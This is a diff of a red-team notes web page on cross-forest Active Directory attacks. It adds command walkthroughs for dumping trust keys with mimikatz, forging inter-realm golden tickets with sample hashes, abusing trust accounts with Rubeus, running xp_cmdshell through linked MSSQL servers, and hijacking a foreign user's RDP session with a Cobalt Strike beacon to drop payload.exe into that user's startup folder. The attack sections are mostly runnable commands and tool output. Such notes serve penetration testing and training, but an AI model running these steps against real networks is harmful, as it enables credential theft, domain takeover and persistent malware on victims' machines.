@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item current"><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -283,37 +341,119 @@
 			<article class="content">
 				<p>In this section we are going to abuse trusts between forests.</p>
 
-<h1 id="across-forest-using-trust-tickets">Across Forest using Trust Tickets</h1>
+<h1 id="one-way-inbound">One-Way (Inbound)</h1>
 
-<p>A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the <em>trust ticket</em> instead of the <em>krbtgt</em> hash.</p>
+<p>When a trust is inbound in our perspective, it means that principals in our domain can be granted access to resources in the foreign domain.</p>
 
-<p>To list the Trust tickets we can use mimikatz:</p>
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::trust /patch"'</span>
-Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainComputer -Domain external.local -Properties DNSHostName
+</code></pre></div></div>
+<ul>
+  <li>BloodHound:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SharpHound.exe -c DcOnly -d external.local
 </code></pre></div></div>
 
-<p>So an inter-forest TGT can be forged:</p>
+<p>We can enuemrate also groups that contains users outside of its domain.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'</span>
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainForeignGroupMember -Domain external.local 
+</code></pre></div></div>
+<p>The <code class="highlighter-rouge">MemberName</code> field contains a SID that can be resolved in our current domain with:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ConvertFrom-SID  S-1-5-21-3263068140-2042693922-2891547269-1132
 </code></pre></div></div>
 
-<p>Now we can request a TGS for <code class="highlighter-rouge">cifs</code> service on the dc of the trusted forest.</p>
+<p>To hop a domain trust using Kerberos, we first need an inter-realm Key. We need a TGT for the target user.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:&lt;aes256&gt; /nowrap
 </code></pre></div></div>
-<p>And inject the ticket on the current session:</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
+<p>Then, we can use the TGT to request a referral ticket form the current domain to the target domain.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /service:krbtgt/target-domain.com /domain:corp.local /dc:dc01.corp.local /ticket:&lt;base64-ticket&gt; /nowrap
 </code></pre></div></div>
+
 <blockquote>
-  <p><strong>Note</strong>: We can not list all the file system of other forest. We can only list shared folders.</p>
+  <p><strong>Note</strong>: The inter-realm ticket is <code class="highlighter-rouge">rc4_hmac</code> even if we created the TGT with <code class="highlighter-rouge">aes256_cts_hmac_sha1</code>. This is a default configuration unless AES has ben specifically configured on the trust.</p>
 </blockquote>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.extcorp.local\share\
+<p>Finally we an use this inter-realm ticket to request a TGS.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /service:cifs/dc.target-domain.com /domain:target-domain.com /dc:dc.target-domain.com /ticket:&lt;base64-inter-realm&gt; /nowrap
 </code></pre></div></div>
 
-<h1 id="trust-abuse-with-mssql-server">Trust Abuse with MSSQL Server</h1>
+<h1 id="one-way-outbound">One-Way (Outbound)</h1>
+
+<p>If Domain A (Me) trusts Domain B, users in Domain B can access resources in Domain A but users in Domain A should not be able to access resources in Domain B. But there are some circumstances in which we can slide under the radar. An example of this includes SQL Server Links.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainTrust -Domain corp.local
+</code></pre></div></div>
+
+<h2 id="trusted-domain-object-tdo-user">Trusted Domain Object (TDO) user</h2>
+
+<p>But, we can still partially exploit this trus and obtain a “Domain User” of the trust abusing the Trusted Domain Object (TDO). Both domains in a trust relationship store a shared password which is automatically changed every 30 days. These objects are stored in the system contained and can be read via LDAP.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain corp.local --attributes distinguishedName,name,flatName,trustDirection
+</code></pre></div></div>
+
+<h3 id="retrieving-the-trusted-key">Retrieving the Trusted Key</h3>
+
+<p>There are two ways:</p>
+
+<ul>
+  <li>Moving laterally to the DC and dump the key from memory.</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; mimikatz lsadump::trust /patch
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: Memory patching is very risky, particularly on domain controllers.</p>
+</blockquote>
+
+<ul>
+  <li>Using DCSync with the TDO GUID.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Identity <span class="s2">"CN=target-domain.com,CN=System,DC=corp,DC=local"</span> | <span class="nb">select </span>objectGuid
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; mimikatz @lsadump::dcsync /domain:corp.local /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">[Out]</code> and <code class="highlighter-rouge">[Out-1]</code> are the “new” and “old” passwords respectively.  In most cases, the current <code class="highlighter-rouge">[Out]</code> key is the one you want.</p>
+
+<h3 id="creating-a-tgt">Creating a TGT</h3>
+
+<p>In addition, there is also a “trust account” which is created in the “trusted” domain, with the name of the “trusting” domain.  For instance, if we get all the user accounts in the DEV domain, we’ll see CYBER$ and STUDIO$, which are the trust accounts for those respective domain trusts.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"
+
+[*] TOTAL NUMBER OF SEARCH RESULTS: 11
+
+        [...]
+	[+] cn : CORP$
+	[+] cn : TARGET$
+</code></pre></div></div>
+
+<p>This meand TARGET domain will have a trust account called <code class="highlighter-rouge">CORP$</code>. This is the account we must impersonate to request Kerberos tickets across the trust.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:CORP$ /domain:target-domain.com /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: RC4 tickets are used by default across trusts.</p>
+</blockquote>
+
+<h2 id="trust-abuse-with-mssql-server">Trust Abuse with MSSQL Server</h2>
 
 <p>MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles.</p>
 
@@ -321,10 +461,14 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span>
 
 <ul>
   <li><a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a>
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUpSQL.ps1
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerUpSQL.psd1
 </code></pre></div>    </div>
   </li>
 </ul>
+
+<blockquote>
+  <p><strong>Note</strong>: Important! Write <code class="highlighter-rouge">Import-Module</code> and import which have <strong>PSD1</strong> extension.</p>
+</blockquote>
 
 <p>We can discover SQL servers:</p>
 
@@ -340,7 +484,7 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 </code></pre></div></div>
 
-<h2 id="database-links">Database Links</h2>
+<h3 id="database-links">Database Links</h3>
 
 <p>A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE.</p>
 
@@ -361,7 +505,9 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span>
 <code class="highlighter-rouge">select * from master..sysservers</code></p>
 
   <p>Openquery() function can be used to run quieries on a linked database:
-<code class="highlighter-rouge">select * from openquery('sql2.corp.local', 'select * from master..sysservers')</code></p>
+<code class="highlighter-rouge">select * from openquery("CORP-SQL1", 'select * from master..sysservers')</code></p>
+
+  <p><code class="highlighter-rouge">select * from openquery("CORP-SQL1", ''select * from openquery("CORP-SQL2", 'master..sysservers'')')</code></p>
 </blockquote>
 
 <p>To execute commands from MSSQL server we need to use <code class="highlighter-rouge">xp_cmdshell</code>. If <code class="highlighter-rouge">rpcout</code> is enabled <code class="highlighter-rouge">xp_cmdshell</code> can be enabled using:</p>
@@ -374,6 +520,142 @@ Invoke-Mimikatz -Command <span class="s1">'"lsadump::lsa /patch"'</span>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query <span class="s2">"exec master..xp_cmdshell 'whoami'"</span>
 </code></pre></div></div>
 
+<h2 id="rdpinception">RDPInception</h2>
+
+<p>Another way is via RDP drive sharing (<strong>RDPInception</strong>). When a user enables drive sharing for their RDP sessions, it creates a mount-point on the target machine that maps back to their local machine. If the target machine is compromised, we may migrate into RDP users’s session and use this mount-point to write files directly onto their machine. Useful for dropping payloads into their startup folder which would be executed the next time they logon.</p>
+
+<p>The strategy is to find principals in our current domain that are not native to that domain, but are from <code class="highlighter-rouge">external.local</code>.</p>
+
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainForeignGroupMember -Domain corp.local
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: We can not convert the SID with <code class="highlighter-rouge">ConvertFrom-SID</code> since we don’t have access to the other Domain.</p>
+</blockquote>
+
+<p>A nice methodology is to enumerate the current domain and find instances where members of the foreign domain, have privileged access (local admin, RDP, WinRM, DCOM access), move laterally to those machines, and camp there until you see a member authenticate. Then, impersonate them to hop the trust.</p>
+
+<p><code class="highlighter-rouge">Get-DomainGPOUserLocalGroupMapping</code> and <code class="highlighter-rouge">Find-DomainLocalGroupMember</code> can work for that task:</p>
+
+<ul>
+  <li>PowerView (dev):</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainGPOUserLocalGroupMapping  -Identity "Jump Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
+Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName
+</code></pre></div></div>
+<p>Once the foreign user logs on one of our compromised computers, we can hijack his RDP session. Example above from Cobalt Strike.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; ps
+
+ PID   PPID  Name                         Arch  Session     User
+ ---   ----  ----                         ----  -------     -----
+ 2365  1012  rdpclip.exe                  x64   3           EXT\j.doe
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; inject 2365 x64 tcp-local
+[+] established link to child beacon: 10.10.10.10
+</code></pre></div></div>
+
+<p>Now at that moment we can do import PowerView and enumerate the domain, because we simply hijacked and existing authenticated session and we are inside a valid <code class="highlighter-rouge">external.local</code> domain.</p>
+
+<p>Inside the user RDP session if <code class="highlighter-rouge">Drive Sharing</code> is enabled a <strong>UNC tsclient</strong> has a mount point for every drive that is being shared over RDP.</p>
+
+<p><code class="highlighter-rouge">\\tsclient\C</code> is the <code class="highlighter-rouge">C:\</code> drive of the origin machine of the RDP session, so we can upload a bat or exe to the users startup folder.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beacon&gt; cd \\tsclient\c\Users\j.doe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+beacon&gt; upload payload.exe
+</code></pre></div></div>
+
+<h1 id="across-forests-using-trust-tickets">Across Forests using Trust Tickets</h1>
+
+<p>First we need to retrieved the Trust Key:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::trust /patch"'</span>
+Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:dcorp\mcorp$"'</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p>
+</blockquote>
+
+<p>An <strong>inter-realm TGT</strong> can be forged:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'</span>
+</code></pre></div></div>
+<ul>
+  <li><strong>Invoke-Mimikatz</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th style="text-align: center"><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/domain:sub.corp.local</td>
+      <td style="text-align: center">Current Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
+      <td style="text-align: center">Current Domain SID</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/user:Administrator</td>
+      <td style="text-align: center">User to impersonate</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/rc4:a9b30e5b0dc865eadcea9411e4ade72d</td>
+      <td style="text-align: center">krbtgt hash of Current Domain</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/service:krbtgt</td>
+      <td style="text-align: center">krbtgt service to abuse</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/target:extcorp.local</td>
+      <td style="text-align: center">Target domain</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/tiket:C:\Windows\Temp\trust_tkt.kirbi</td>
+      <td style="text-align: center">File to store the ticket</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Now we can request a TGS for <code class="highlighter-rouge">cifs</code> service on the dc of the trusted forest.</p>
+
+<ul>
+  <li>Asktgs.exe (kekeo_old)</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
+</code></pre></div></div>
+
+<ul>
+  <li>Rubeus.exe
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /ticket:trust_forest_tkt.kirbi /dc:dc01.extcorp.local /service:CIFS/dc01.extcorp.local
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>And inject the ticket on the current session:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\kirbikator.exe lsa .\CIFS.dc01.extcorp.local.kirbi
+</code></pre></div></div>
+<blockquote>
+  <p><strong>Note</strong>: We can not list all the file system of other forest. We can only list shared folders.</p>
+</blockquote>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\dc01.extcorp.local\share\
+</code></pre></div></div>
 
 			</article>
 		</section>
